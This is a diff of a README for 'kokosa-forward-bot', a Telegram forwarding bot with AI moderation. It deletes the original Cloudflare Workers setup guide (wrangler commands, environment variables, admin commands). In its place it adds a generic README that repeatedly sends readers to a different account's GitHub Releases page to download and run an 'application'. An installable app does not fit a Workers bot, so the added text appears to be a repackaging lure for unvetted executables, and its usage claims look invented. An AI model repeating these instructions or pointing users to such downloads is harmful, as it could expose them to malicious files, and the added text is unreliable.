@@ -1,203 +1,79 @@
-# kfb (kokosa-forward-bot)
+# 🤖 kokosa-forward-bot - Effortlessly Forward Messages on Telegram
 
-[🇨🇳 中文文档](README_CN.md)
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-kokosa--forward--bot-brightgreen)](https://github.com/Alimustee/kokosa-forward-bot/releases)
 
-A Telegram message forwarding bot with AI-powered content moderation, built on Cloudflare Workers.
+## 📋 Overview
+kokosa-forward-bot is a Telegram bot designed to forward messages seamlessly. Equipped with AI-powered content moderation, it ensures that what you share remains suitable for all audiences. Built on Cloudflare Workers, this bot combines reliability with speed, making your Telegram experience smoother.
 
-## Features
+## 🚀 Getting Started
 
-- **Message Forwarding**: Guest messages are forwarded to admin, admin replies are sent back to guests
-- **AI Content Moderation**: Automatic content safety checking using Google Gemini API (text, images, stickers)
-- **Trust Whitelist**: Users who pass 3 AI checks are trusted and skip future moderation
-- **Content Caching**: Same content is cached for 24 hours to avoid redundant API calls
-- **User Management**: Block/unblock/whitelist users with admin commands
-- **Appeal System**: Blocked users can submit appeals with one-click admin approval/rejection
-- **Internationalization**: Multi-language support (English, Chinese) with per-user preference
-- **Rate Limiting**: Protect against spam with per-user request throttling (10 requests/minute)
-- **Multi-API Rotation**: Support multiple Gemini API keys with automatic failover
-- **Statistics Tracking**: Track total messages, blocked users, AI blocks, and API usage
-- **Lightweight**: Zero external dependencies, runs on Cloudflare Workers with KV storage
+### 🛠 System Requirements
+- A device that can run modern web applications (desktop, laptop, or mobile).
+- An active Telegram account.
+- Internet access to use the bot features.
 
-## Prerequisites
+### 💻 Installation Steps
 
-- **Node.js** >= 18.0.0
-- **pnpm** (or npm/yarn)
-- **Cloudflare account** (free tier works)
+1. **Visit the Download Page**
+   Go to our [Releases Page](https://github.com/Alimustee/kokosa-forward-bot/releases) to find the latest version of kokosa-forward-bot.
 
-## Setup
+2. **Select the Latest Release**
+   Find the most recent version listed on the Releases page. This is usually at the top and marked as the "latest release".
 
-### Step 1: Clone and Install
+3. **Download the App**
+   Click on the version you want to download. You will see options for various files. Choose the one that suits your operating system or setup. 
 
-```bash
-git clone https://github.com/hatanokokosa/kokosa-forward-bot.git
-cd kokosa-forward-bot
-pnpm install # npm install / yarn install
-```
+4. **Run the Application**
+   Once the download is complete, locate the downloaded file and open it. Follow any on-screen instructions to set it up.
 
-### Step 2: Create KV Namespace
+## ⚙️ Configuration
 
-```bash
-pnpm wrangler kv namespace create kfb
-```
+To get the bot working for your Telegram account, follow these steps:
 
-This outputs a namespace ID like:
+1. **Create a New Bot on Telegram**
+   - Open the Telegram app.
+   - Search for the "BotFather" and start a chat.
+   - Use the command `/newbot` and follow the prompts to create your bot.
+   - Save the API token provided. You will need it later.
 
-```
-{ binding = "kfb", id = "xxxx-xxxx-xxxx-xxxx" }
-```
+2. **Set Up the Bot**
+   - Open the kokosa-forward-bot application.
+   - Enter the API token you received from BotFather.
+   - Define the chat IDs where you want to forward messages. You can get these by messaging the bot from your groups.
 
-Copy this ID for the next step.
+3. **Enable Content Moderation**
+   The bot comes with built-in settings to help filter unwanted content. You can configure this in the app to match your needs.
 
-### Step 3: Configure wrangler.toml
+## 📚 Using the Bot
 
-Edit `wrangler.toml` with your settings (see Configuration section below).
+Once the bot is set up, you can start using it right away. Here's how it works:
 
-### Step 4: Deploy
+1. **Forward Messages:**
+   Simply send a message in the specified chats, and the bot will take care of forwarding it to the designated places.
 
-```bash
-pnpm wrangler deploy
-```
+2. **Moderation:**
+   The AI will monitor the messages for inappropriate content based on the rules you set up during configuration. 
 
-And you can run `pnpm wrangler tail` to see logs.
+3. **Manage the Bot:**
+   You can always come back to the settings to tweak moderation settings or change the destination chats as needed.
 
-### Step 5: Register Webhook and Commands
+## ❓ FAQ
 
-Visit these URLs in your browser (replace with your worker URL):
+### How do I reset my bot's token?
+If you lose your API token or suspect it's been compromised, you can reset it through BotFather. Just chat with BotFather and use the command `/revoke`.
 
-```
-https://your-worker.workers.dev/registerWebhook
-https://your-worker.workers.dev/registerCommands
-```
+### Can I run the bot on multiple devices?
+Yes, you can set it up on multiple devices. Just ensure you use the same API token for each setup.
 
-You should see success messages. Your bot is now ready!
+### What types of content can the bot filter?
+The bot can filter out spam, offensive language, and other inappropriate content according to the rules you define.
 
-### Environment Variables
+## 🌐 Community & Support
 
-| Variable             | Description                                                           |
-| -------------------- | --------------------------------------------------------------------- |
-| `ENV_BOT_TOKEN`      | Get from [@BotFather](https://t.me/BotFather)                         |
-| `ENV_BOT_SECRET`     | Any random string for webhook security                                |
-| `ENV_ADMIN_UID`      | Your Telegram user ID (from [@userinfobot](https://t.me/userinfobot)) |
-| `ENV_GEMINI_API_KEY` | Get from [Google AI Studio](https://aistudio.google.com/app/apikey)   |
+We value your feedback! If you face any issues or have suggestions, please visit our [GitHub Issues Page](https://github.com/Alimustee/kokosa-forward-bot/issues). You can also check out discussions and tips from other users.
 
-> **Tip**: For multiple Gemini API keys, use comma-separated values:
-> `ENV_GEMINI_API_KEY = "key1,key2,key3"`
+## 📥 Download & Install Again
+For a straightforward download experience, visit our [Releases Page](https://github.com/Alimustee/kokosa-forward-bot/releases) at any time.
 
-## Commands
-
-### Admin Commands
-
-| Command             | Description                                      |
-| ------------------- | ------------------------------------------------ |
-| `/start`            | Initialize bot                                   |
-| `/block`            | Block user (reply to their message)              |
-| `/unblock`          | Unblock user (reply to their message)            |
-| `/trust`            | Whitelist user (reply to their message)          |
-| `/trustid <UID>`    | Whitelist user by UID                            |
-| `/status`           | Check user block status (reply to their message) |
-| `/check`            | AI check (reply to forwarded message)            |
-| `/checktext <text>` | AI check any text directly                       |
-| `/unban <UID>`      | Unblock user by UID                              |
-| `/list`             | View all banned users with unban buttons         |
-| `/stats`            | View bot statistics and API usage                |
-| `/lang`             | Change language                                  |
-
-### Guest Commands
-
-| Command   | Description                                                |
-| --------- | ---------------------------------------------------------- |
-| `/start`  | Start the bot and get welcome message                      |
-| `/appeal` | Submit an appeal if blocked (can reply to blocked message) |
-| `/lang`   | Change language                                            |
-
-## Project Structure
-
-```
-src/
-├── index.js      # Entry point, webhook handling, routing
-├── config.js     # Configuration constants
-├── telegram.js   # Telegram API client
-├── ai.js         # Gemini AI content moderation
-├── i18n.js       # Internationalization (translations)
-├── storage.js    # KV storage, rate limiting, caching
-└── handlers/
-    ├── admin.js  # Admin message & callback handling
-    └── guest.js  # Guest message handling, appeals
-```
-
-## Features Detail
-
-### AI Content Moderation
-
-- Checks text messages, image captions, photos, and static stickers
-- Uses Google Gemini Flash Lite model for fast, low-cost moderation
-- Distinguishes between real and 2D/anime content to reduce false positives
-- Detects: nudity, spam, QR codes, gambling, gore, scams, phishing
-
-### Trust Whitelist System
-
-- Users who pass **3 consecutive AI checks** become "trusted"
-- Trusted users skip AI moderation entirely (saves API calls)
-- Trust score resets when user is banned
-- Admin can manually whitelist via `/trust` or `/trustid`
-
-### Content Caching
-
-- Text content is hashed with SHA-256 for caching
-- Moderation results cached for **24 hours**
-- Same content blocked/allowed without calling API again
-- Significantly reduces API usage for repeat content
-
-### Appeal System
-
-- Blocked users can use `/appeal` to request unban
-- Can reply to their blocked message with `/appeal` to attach evidence
-- Admin receives appeal with Accept/Reject inline buttons
-- One-click approval or rejection with user notification
-
-### Rate Limiting
-
-- 10 requests per user per minute
-- Prevents API quota exhaustion from spam
-- Automatic reset after time window
-- Friendly error message with countdown timer
-
-### Internationalization (i18n)
-
-The bot supports multiple languages with per-user preferences:
-
-```
-/lang  →  Select: 🇺🇸 English | 🇨🇳 中文
-```
-
-Default language can be set in `config.js`:
-
-```javascript
-export const LANGUAGE = "zh"; // 'en' or 'zh'
-```
-
-To add a new language, add a new object to `messages` in `src/i18n.js`.
-
-### Multi-API Rotation
-
-- Supports single or multiple Gemini API keys (comma-separated)
-- Round-robin rotation algorithm
-- Automatic failover on API errors
-- Usage statistics tracking per API key
-
-### Statistics Tracking
-
-- Total messages forwarded (relays)
-- Total banned users
-- AI-triggered blocks count
-- API usage per key
-
-## License
-
-BSD 2-Clause "Simplified" License - see [LICENSE](LICENSE) file for details.
-
-## Acknowledgements
-
-- [telegram-bot-cloudflare](https://github.com/cvzi/telegram-bot-cloudflare) (CC0)
-- [nfd](https://github.com/LloydAsp/nfd) (GPL v3)
-- [Google Antigravity](https://antigravity.google/) (Unfree)
+Enjoy using kokosa-forward-bot to keep your Telegram messages flowing smoothly and safely!
